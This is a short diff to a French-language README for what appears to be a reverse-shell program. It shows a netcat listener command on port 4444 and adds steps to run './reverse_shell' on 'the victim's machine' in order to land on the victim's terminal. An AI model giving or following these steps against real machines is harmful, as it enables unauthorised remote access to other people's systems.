@@ -48,6 +48,12 @@ Exemple avec port defini dans le prog (mais modifiable)
 nc -lvp 4444 
 ```
 
-Et sur la machine de la victime executer le prog 
+Sur la machine de la victime executer le prog 
+
+```
+./reverse_shell
+```
+
+Enfin une fois le message de connexion de la victime a votre port sur ecoute, vous voila sur son terminal !
 
 
